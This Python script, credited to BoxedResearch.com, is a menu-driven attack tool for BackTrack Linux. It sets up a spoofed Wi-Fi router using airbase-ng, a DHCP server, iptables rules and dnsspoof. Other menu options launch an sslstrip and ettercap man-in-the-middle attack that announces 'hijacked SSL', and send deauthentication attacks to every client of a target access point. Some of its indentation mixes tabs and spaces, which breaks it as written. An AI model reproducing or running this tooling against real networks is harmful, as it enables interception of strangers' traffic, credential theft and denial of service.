#!/usr/bin/env python
# -*- coding: Utf-8 -*-

# Installer for the spoofed router. Assuming apache2/dhcp3 installed
# Scripted for BackTrack Linux 4-5

__app__ = 'RouterSpoof'
__verions__ = '1.0'
__author__ = 'BoxedResearch.com'

import signal
from Tkinter import *
from lib.rsfunctions import *

def signal_handler(signal, frame):
    stop_attacks()
    print("\n\n-- Closing --")
    print("-- Report bugs to Support@BoxedResearch.com -- \n")
    sys.exit(0)

def menu():
	print("1. Install the router package")
	print("2. Launch the web server")
	print("3. Verify your server page")
	print("4. Configure the AP/Interface")
	print("5. Launch the spoofed AP")
	print("6. Launch the spoofed AP (With sslstrip MITM Attack)")
	print("7. Deauthenticate All Clients From Target AP")
        print("8. SHUT DOWN ALL SYSTEMS")
        return input("Your choice ? : ")


signal.signal(signal.SIGINT, signal_handler)
screen_clear()
print("-- Configuring --")
launch_depedency_validator()
print("[ OK! ]")
sleep(2)
screen_clear()

# BEGIN MENU
user_selection = menu()

while user_selection != 8:

	if user_selection == 1:
    		screen_clear()
    		print("-- Configuring enviornment --\n")
    		configure_router_package()
    		sleep(2)
    		screen_clear()
    		user_selection = menu()

	elif user_selection == 2:
    		screen_clear()
    		print("-- Launching services --\n")
    		sleep(2)
    		os.system("service apache2 start")
    		sleep(2)
    		screen_clear()
    		user_selection = menu()

	elif user_selection == 3:
    		screen_clear()
    		print("-- Opening the spoofed browser page--\n")
    		sleep(2)
    		os.system("firefox 127.1.1.0")
    		sleep(2)
    		screen_clear()
    		user_selection = menu()

	elif user_selection == 4:
    		screen_clear()
		print("-- Configuring the AP/Interfaces --\n")
    		configure_airbase()
    		screen_clear()
    		user_selection = menu()

	elif user_selection == 5:
		screen_clear()
    		print("-- Launching The Spoofed Router --\n")
    		launch_wireless_ap()
    		launch_dhcpd_server()
                config_iptables_ATx()
    		launch_dnsspoof()
    		screen_clear()
		user_selection = menu()

	elif user_selection == 6:
	    print("-- Launching The Spoofed Router With sslstrip MITM --\n")
	    os.system("killall -9 dhcpd tcpdump airbase-ng")
	    launch_wireless_ap()
            launch_dhcpd_server()
            config_iptables_ETHx()
	    os.system("xterm -hold -e sslstrip -a -k -f")
	    os.system("xterm -hold -e ettercap -T -q -p -i at0")
            print("The AP is running with hijacked SSL, waiting clients to connect")
    	    sleep(6)
	    screen_clear()
	    user_selection = menu()

        elif user_selection == 7:
		screen_clear()
		sleep(2)
    		print("-- Deauthenticating All Associated Clients --")
                configure_airdrop()
    		launch_airdrop()
    		print("Attack finished.")
    		sleep(6)
    		screen_clear()
		user_selection = menu()
	else :
		screen_clear()
		print("ERROR : Incorrect option selected.")
		user_selection = menu()
# END Menu

signal_handler(signal.SIGINT, None)

# END Application